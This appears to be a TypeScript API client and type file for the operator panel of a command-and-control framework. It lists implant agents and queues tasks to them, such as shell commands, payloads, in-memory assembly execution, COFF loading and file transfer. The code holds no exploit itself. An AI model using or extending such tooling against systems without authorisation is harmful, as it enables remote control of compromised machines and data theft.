import type { Agent, Result, Task } from './types'

const BASE: string =
    import.meta.env.VITE_API_BASE || 'http://localhost:8080'

interface RequestOptions {
    method?: 'GET' | 'POST'
    body?: unknown
}

async function request<T>(
    path: string,
    { method = 'GET', body }: RequestOptions = {},
): Promise<T> {
    const headers: Record<string, string> = {}

    if (body !== undefined) {
        headers['Content-Type'] = 'application/json'
    }

    const res = await fetch(`${BASE}${path}`, {
        method,
        headers,
        body: body !== undefined ? JSON.stringify(body) : undefined,
    })

    if (!res.ok) {
        const data = (await res.json().catch(() => ({}))) as {
            error?: string
        }

        throw new Error(data.error || `HTTP ${res.status}`)
    }

    return res.json() as Promise<T>
}

export const api = {
    agents: async () =>
        (await request<Agent[] | null>('/agents')) ?? [],

    results: async (id: string) =>
        (await request<Result[] | null>(
            `/results?id=${encodeURIComponent(id)}`,
        )) ?? [],

    queue: (id: string, task: Task) =>
        request<unknown>(`/queue?id=${encodeURIComponent(id)}`, {
            method: 'POST',
            body: task,
        }),
}

// NOTE: must match the values the Go API accepts in queueCmd()
// AND the values the Rust agent matches in dispatch_task().
export type TaskType =
    | 'shell'
    | 'payload'
    | 'execute_assembly'
    | 'file_upload'
    | 'file_download'
    | 'sleep'
    | 'process'
    | 'coff_loader'

export interface AgentInfo {
    user: string
    host: string
    os: string
}

export interface Agent {
    id: string
    info: AgentInfo
    last_seen: string
}

export interface Result {
    id: number
    agent_id: string
    command: string
    output: string
    created_at: string
}

export interface Task {
    type: TaskType
    command?: string
    payload_id?: string
    /** coff_loader only — [url_or_id, arg1, arg2, ...] */
    coff_args?: string[]
}

export interface ProcessInfo {
    processId: number
    parentProcessId: number
    name: string
}

export interface ProcessNode extends ProcessInfo {
    children: ProcessNode[]
}